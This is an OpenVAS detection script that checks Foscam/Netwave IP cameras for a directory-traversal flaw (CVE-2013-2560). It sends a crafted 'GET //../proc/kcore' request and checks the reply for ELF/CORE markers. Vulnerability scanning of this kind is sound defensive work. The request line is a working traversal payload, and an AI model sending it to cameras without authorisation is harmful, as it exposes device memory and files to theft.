###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_foscam_58290.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Foscam Prior to 11.37.2.49 Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103679");
  script_bugtraq_id(58290);
  script_cve_id("CVE-2013-2560");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_version("$Revision: 11865 $");

  script_name("Foscam Prior to 11.37.2.49 Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58290");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-15 12:24:18 +0100 (Fri, 15 Mar 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Netwave_IP_Camera/banner");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Foscam is prone to a directory-traversal vulnerability.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application. This may aid in further attacks.");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");



port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Netwave IP Camera" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

send(socket:soc, data: string("GET //../proc/kcore HTTP/1.0\r\n\r\n"));
recv = recv(socket:soc, length:500);

close(soc);

if("ELF" >< recv && "CORE" >< recv) {

  security_message(port:port);
  exit(0);

}

exit(0);

